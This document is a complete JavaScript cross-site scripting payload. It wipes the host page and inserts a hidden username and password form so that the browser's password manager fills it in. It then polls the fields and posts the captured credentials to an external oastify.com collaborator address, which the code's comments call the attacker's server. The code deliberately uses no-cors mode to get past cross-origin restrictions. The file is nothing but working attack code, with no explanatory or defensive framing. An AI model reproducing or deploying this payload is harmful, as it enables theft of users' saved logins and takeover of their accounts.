<script>
document.body.innerHTML = "";
var scriptss = document.scripts;

for (var i = scriptss.length - 1; i >= 0; i--) {
  var script = scriptss[i];
  script.parentNode.removeChild(script);
}

var s = document.createElement('style');
var c = 'body > *:not(form):not(textarea) { display: none !important; }';
s.appendChild(document.createTextNode(c));
document.head.appendChild(s);

var form = document.createElement('form');

var inputName = document.createElement('input');
inputName.type = 'text';
inputName.id = 'username';
inputName.name = 'username';
inputName.autocomplete = 'username';
inputName.placeholder = 'Check here';
inputName.style.border = "none";
inputName.style.outline = "none";
inputName.style.background = "none";
inputName.style.width = "100%";
inputName.classList.add("single-input");

var inputPassword = document.createElement('input');
inputPassword.type = 'password';
inputPassword.id = 'password';
inputPassword.name = 'password';
inputPassword.autocomplete = 'current-password';
inputPassword.style.border = "none";
inputPassword.style.outline = "none";
inputPassword.style.background = "none";
inputPassword.style.padding = "0";
inputPassword.style.width = "1%";
inputPassword.classList.add("single-input");

form.appendChild(inputName);
form.appendChild(inputPassword);
document.body.appendChild(form);

// Function to send credentials to the attacker's server
function sendCredentials(username, password) {
  fetch('https://itfns50mhr60zgv6ftorxh69p0vrjh76.oastify.com/?creds=', {
    method: 'POST',
    mode: 'no-cors',  // This bypasses CORS checks
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      username: username,
      password: password
    })
  })
  .then(() => {
    console.log('Credentials sent (CORS bypassed)');
  })
  .catch(error => console.error('Error sending credentials:', error));
}


// Function to check if both username and password are filled
function checkAndSend() {
  let usernameValue = document.getElementById('username').value;
  let passwordValue = document.getElementById('password').value;
  
  if (usernameValue && passwordValue) {
    sendCredentials(usernameValue, passwordValue);
  }
}

// Automatically check for autofill or manual input without user interaction
setTimeout(function () {
  let usernameInput = document.getElementsByName('username')[0];
  let passwordInput = document.getElementsByName('password')[0];

  // Continuously monitor if both fields are filled
  let interval = setInterval(() => {
    if (usernameInput.value.length > 0 && passwordInput.value.length > 0) {
      clearInterval(interval);  // Stop checking once fields are filled
      checkAndSend();  // Send credentials automatically
    }
  }, 500);  // Check every 500ms
}, 1000);
</script>
